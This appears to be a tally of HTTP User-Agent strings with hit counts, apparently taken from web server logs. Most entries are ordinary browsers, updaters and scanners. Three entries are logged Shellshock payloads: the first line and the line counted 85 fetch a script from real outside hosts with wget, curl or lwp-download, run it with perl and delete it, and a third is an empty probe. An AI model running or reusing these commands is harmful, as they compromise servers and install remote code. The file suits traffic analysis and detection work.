1;() { :;}; /bin/bash -c "cd /tmp;lwp-download -a http://185.70.10.139/mk2;curl -O http://185.70.10.139/mk2;wget http://185.70.10.139/mk2;perl mk2;perl /tmp/mk2;rm -rf /tmp/mk2*"
4;17track - ProxyAnalytics
4;A/5.1.1/Sony/D6503/MSM8974/MTS#RUS
4;DavClnt
4;Google Update/1.3.24.15;winhttp
4;HP-Inkjet-WebUpdate-1.1-lw
4;InTouchDownloader
4;LibreOffice 4.3.4.1 (bc356b2f991740509f321d70e4512a6a54c5f243; Windows; x86; BundledLanguages=en-US af am ar as ast be bg bn bn-IN bo br brx bs ca ca-valencia cs cy da de dgo dz el en-GB en-ZA eo es et eu fa fi fr ga gd gl gu he hi hr hu id is it ja ka kk km kmr-Latn kn ko kok ks lb lo lt lv mai mk ml mn mni mr my nb ne nl nn nr nso oc om or pa-IN pl pt pt-BR ro ru rw sa-IN sat sd sr-Latn si sid sk sl sq sr ss st sv sw-TZ ta te tg th tn tr ts tt ug uk uz ve vi xh zh-CN zh-TW zu)
4;Microsoft-WNS/10.0
4;Mozilla/4.0 (compatible; qip4983; QSI13; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
4;Mozilla/4.0 (compatible; qip4983; QSI16; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
4;Mozilla/4.0 (compatible; qip4983; QSI30; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
4;Mozilla/4.0 (compatible; qip4983; QSI6; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
4;Mozilla/4.0 (compatible; qip8092; Windows NT 5.1; ID:97e22767e9d3be28558047445f0f6835)
4;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)
4;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8
4;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36
4;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2.1
4;Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0
4;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
4;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3
4;null (primou IML74K); gzip
4;PicasaUpdater/3.9.138.151 (gzip)
4;Ray-Downer
4;RDSClient
4;Skype� 6.20
4;TWSDK
4;unused/0 (primou IML74K); gzip
4;WinDjView
4;Xenu Link Sleuth/1.3.8
4;xmlset_roodkcableoj28840ybtide
40;Chrome WIN 45.0.2454.101 (3b3c00f2d95c45cca18ab944acced413fb759311-refs/branch-heads/2454@{#502}) channel(stable)
40;Mozilla/4.0 (compatible; qip8082; Windows NT 6.0; ID:b980dbe40744289df13f55cc4bc26e3c)
40;Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091211 Sunbird/1.0b1
403;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.95 Safari/537.36
409;libcurl/7.43.0 OpenSSL/1.0.1l zlib/1.2.8
41;Dr.Web anti-virus License:DRWEB KEY (Support ES) LicenseState:LICENSE KEY Version: 9.01.3.7037 Device model: Ixion X250 OctaVa Firmware version: 4.4.2
41;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; QQDownload 717; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
41;NSPlayer/12.00.9651.0000 WMFSDK/12.00.9651.0000
412;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36 OPR/29.0.1795.47
41205;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47
413;Mozilla/4.0 (compatible; qip4983; Windows NT 5.1)
42;2gis/1.0.0.5247 (Windows 5.1 build 2600 NT Service Pack 3) cc54d6bc-b764-4e37-9737-5b8da65bd5dd
42;Mozilla/4.0 (CCleaner, 5.14.5493)
42;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:c2603537ba918a65429e6b6fbf069b48)
4218;NativeHost
43;Mozilla/4.0 (compatible; qip4983; Windows NT 5.1;
4305;Mozilla/5.0
43836;2gis/3.14.6.4714 (Windows 6.1 build 7601 NT Service Pack 1) e75bc49b-a6e1-40af-8020-d2685f89db46
44;Wget/1.11.4
445043;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
445602;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.103 Safari/537.36
45;Mozilla/4.0 (compatible; MSIE 9.11.9600.18124; Windows NT 6.1)
45;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:7d91c723f63376a4bb71e689914dfe5d)
455;MRAICQ 8.3 (build 7317) siga.zlo@list.ru icq
456;Mozilla/4.0 (compatible; MSIE 9.11.9600.18163; Windows NT 6.1)
456;MPFv
459;okhttp/2.6.0
459099;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
459919;Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0
46;mp-ua/3.0.0/a=ARMv7Processorrev2(v7l)/h=MT6589
46;ZmEu
462;2gis/3.15.10.4952 (Windows 5.1 build 2600 NT Service Pack 3) 8bfbc53c-3363-4c85-bd5c-3e9ec42bf632
464;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36
47;apache 0day by @hxmonsegur
47;eTranslator
47;Mozilla/4.0 (compatible; qip8082; Windows NT 5.1; ID:ec325620db2fa5b85d4697b1ae1a90d3)
47;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:d7c6c320677939ec051042a65483112a)
47;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:fd88ab401d5c46bea8f90beadce3c70d)
470;Smart Panel
47310;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.82
48;Google Update/1.3.29.5;winhttp
48;Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.18) Gecko/20110628 Ubuntu/10.04 (lucid) Firefox/3.6.18
483;Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
4844;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.5; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
49;AVGDM-WV7XDX64 160 BUILD=7442 MSI=0 LOC=RU PRD=RU-F-Free BRD=0-0-0 BRH=0 PKG=692 PKP=0
49;Mozilla/4.0 (compatible; qip4301; QSI; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
49;Windows-Media-Player/11.0.5721.5280
495;AntUx config manager
495;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.5; MRA 8.3 (build 7317); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
5;"nlpproject.info research"
5;(null)/(null) ((null))
5;1.7.3-B/267349/4.1.2
5;AutoIt
5;curl/1.1
5;curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.19.1 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2
5;curl/7.43.0
5;Dr.Web anti-virus Light Version: 9.00.2.14001 Device model: THL W200 Firmware version: 4.2.2
5;Dr.Web Light Version: 9.01.2.14007 Device model: H7500+ Firmware version: 4.1.2
5;Microsoft-WNS/6.3
5;Mozilla/3.0 (compatible)
5;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)
5;Mozilla/4.0 (compatible; qip4983; QSI1; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
5;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
5;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
5;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36 Scanning for research (researchscan.comsys.rwth-aachen.de)
5;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 OPR/35.0.2066.37 (Edition Campaign 34)
5;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
5;webtrans
50;Mozilla/4.0 (compatible; qip8095; Windows NT 6.0; ID:795ef57d53f9bea0c4efbf51b85dd8bc)
50;NSPlayer/10.0.0.3702 WMFSDK/10.0
50;unused/0 (k05ts_a LMY47D); gzip
50241;MRAICQ 8.4 (build 7786) +79215954436 icq
502848;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
51;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:b2f1be5224c36fa8bf22fb0174fdc61a)
51;VLC media player - version 0.9.8a Grishenko - (c) 1996-2008 the VideoLAN team
52;Mozilla/4.0 (compatible; qip8092; Windows NT 5.1; ID:e14f92973aa7439472fa9095bf33a6ba)
52;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
52;Office Source Engine
521;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/537.86.4
523;HTTPS Client
53;Mozilla/4.0 (compatible; qip4983; QSI; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
53;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:de4da634b74f39a4580ac1937c98381d)
53;Ruby
5313;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36 OPR/32.0.1948.69 (Edition Yx)
53589;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.92
53635;MRAICQ 8.4 (build 7786) 699879647 icq
5382;uTorrent/345(109814172)(41372)
54;Mozilla/4.0 (compatible; qip8092; Windows NT 5.1; ID:49bdcf531ea8599bc532d1fed5d21de8)
5573;MRAICQ 8.3 (build 7317) 676775123 icq
56;Mozilla/4.0 (compatible; qip7000; Windows NT 5.1;
56;Mozilla/4.0 (compatible; qip8082; Windows NT 6.0; ID:9021a6147d1c0cb5d6009c88ca8d9464)
56;Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0
56;uTorrent/345(109814665)(41865)
57;iTVA Installer
57;Mozilla/4.0 (compatible; qip7000)
57675;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.92
579;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
58;MEIZU
58;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.5.1 Lightning/4.0.5.2
58;NVIDIA GFE v10.11.15
5864;MailRuUpdater
59;/4.0.0.2
59;Mozilla/5.0 zgrab/0.x
59;NVIDIA GFE v18.5.1
59077;MRAICQ 8.3 (build 7317) 488722743 icq
594;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; InfoPath.1)
5944;Mozilla/5.0 (Windows NT 5.1; rv:45.0) Gecko/20100101 Firefox/45.0
595;ut_core BenchHttp (ver:41712)
6;curl/7.38.0
6;masscan/1.0 (https://github.com/robertdavidgraham/masscan)
6;Microsoft Office/11.0 (Windows NT 6.1; Microsoft Excel 11.0.8172; Pro)
6;Mozilla/4.0 (compatible; MSIE 6.0; Windows 2000)
6;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)
6;Mozilla/4.0 (compatible; qip4301; QSI1; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
6;Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
6;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.16 (KHTML, like Gecko) Version/8.0 Safari/537.16
6;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.5.1 Lightning/4.0.5.1
6;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
6;Picasa/3.9.138.151 (gzip)
6;samsung GT-I9190 SyncML_DM Client
6;THL W200; MIUI/4.3.14_region98
6;www.probethenet.com scanner
607;IPM
61;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.6.0 Lightning/4.0.6
616;ut_core BenchHttp (ver:41372)
619;�������� 2.3.
62;QipGuard 2.7.3
62;WebTroubleshootingService
624;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
63292;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36 OPR/35.0.2066.68
6411;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; )
644601;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
6470;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36
6483;TXUpdater v. 2.2.4.1203 / Windows 0x1DB10106
65;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)
65;PCU
65210;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 OPR/35.0.2066.37
6552;MRAICQ 8.3 (build 7317) +79818203015 icq
66;2gis/1.0.0.4952 (Windows 5.1 build 2600 NT Service Pack 3) 8bfbc53c-3363-4c85-bd5c-3e9ec42bf632
67658;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 OPR/35.0.2066.37
68;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
682017;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
6883;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36 OPR/32.0.1948.69
689;WicaAgent
698;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; BRI/2)
7;APUpdater/3.14.0 (2d6f5)
7;Breakpad/1.0 (Windows)
7;Java/1.6.0_37
7;m2 note; 5.1; Flyme OS 4.5.4.1I; ru-ru
7;Mozilla/4.0 (compatible; qippda)
7;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
7;Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
7;okhttp/2.7.2
7;the beast
7;WP
70;Mozilla/4.0 (compatible; qip7000; Windows NT 5.1)
70;OndemandCM Winhttp Download
700;Microsoft NCSI
72;2gis/3.15.10.4952 (Windows 5.1 build 2600 NT Service Pack 3) cc54d6bc-b764-4e37-9737-5b8da65bd5dd
72;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/538.1 (KHTML, like Gecko) Droid4X Safari/538.1
7233;uTorrent/345(109814512)(41712)
73;Microsoft-WebDAV-MiniRedir/5.1.2600
7380;Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.11
73915;Mozilla/4.0
74;Mozilla/4.0 (compatible; qip4983)
748;Mozilla/5.0 (Windows NT 5.1; rv:42.0) Gecko/20100101 Firefox/42.0
75;Foxit Reader Updater
75;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586
75;MRAICQ 8.3 (build 7317) +79522448300 icq
75;unused/0 (LT22i 6.2.A.1.100); gzip
756;Opera autoupdate agent/1.1.11
76;1.7.3-B/267349/5.0.2
76;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Excel 11.0.8172; Pro)
76;VCSoapClient
77;DXCoreService
77;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Office Word 11.0.8172; Pro)
77;Mozilla/3.0 (compatible; Indy Library)
77;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.6.0
78;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.1; .NET CLR 2.0.50727)
784;Mozilla/5.0 (Windows NT 5.2; rv:27.0) Gecko/20100101 Firefox/27.0
792;WSLib 1.4 [1, 0, 96, 0]
8;������� �����
8;FoxitReaderUpdater
8;java_installer
8;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; BRI/2; Windows-Media-Player/12.0.7601.17514)
8;Mozilla/4.0 (compatible; qip4983; QSI4; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
8;okhttp/2.3.0
8;OMSI/2.16.3.201602121455 Java/1.8.0_60
8;Opera NetInstaller/35.0.2066.68
8;RestSharp/105.2.3.0
80279;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36 OPR/34.0.2036.50
8029;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
807;Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)
8132;Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0
82;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Office Word 11.0.8202; Pro)
82;uTorrent/345(109813962)(41162)
8259;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 YaBrowser/15.7.2357.2877 Safari/537.36
848;BTWebClient/3450(41372)
85;() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://sageandsandgrill.com/t3.log -O /tmp/t3.log;curl -O /tmp/t3.log http://sageandsandgrill.com/t3.log;perl /tmp/t3.log;rm -rf /tmp/t3.log*");'
85;okhttp/2.4.0
8534;Apache-HttpClient/UNAVAILABLE (java 1.4)
857;BTWebClient/3450(41712)
86;AVGDM-WV7XDX64 160 BUILD=7442 MSI=4855 LOC=RU PRD=RU-F-Free BRD=0-0-0 BRH=def_upg15istrial PKG=692 PKP=0
87;DownloadHttp1.0.0 (1.0.0)
88;MD_VersionCheck
885;CloudSDK
89;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.5.1
9;() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("");'
9;HP Lookup Agent
9;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko/20100101 Firefox/12.0
9;Skype� 7.12
9;Skype Upgrade
9;SonyLT22i Build/6.2.A.1.100 UpdateCenter/1.3.4.A.0.11
9;Test Agent
9;WLMHttpTransport
90;Mozilla/4.0 (compatible; MSIE 6.0; DynGate)
91;ocspd/1.0.2
92410;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
92681;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0)
939;Mozilla/4.0 (compatible; MSIE 8.0.6001.18702; Windows NT 5.1)
947;BingBar 7.3.132.0
949;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
95369;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 YaBrowser/16.2.0.3539 Safari/537.36
965;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
97;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Office Outlook 11.0.8172; Pro)
97461;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36 OPR/34.0.2036.50
98974;Mozilla/5.0 (Windows NT 5.1; rv:44.0) Gecko/20100101 Firefox/44.0
99;2gis/1.0.0.5247 (Windows 5.1 build 2600 NT Service Pack 3) 97774056-0766-4139-ac33-fcf5bfb72dd2
99;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Office Outlook 11.0.8202; Pro)
99;Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.00
9986;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
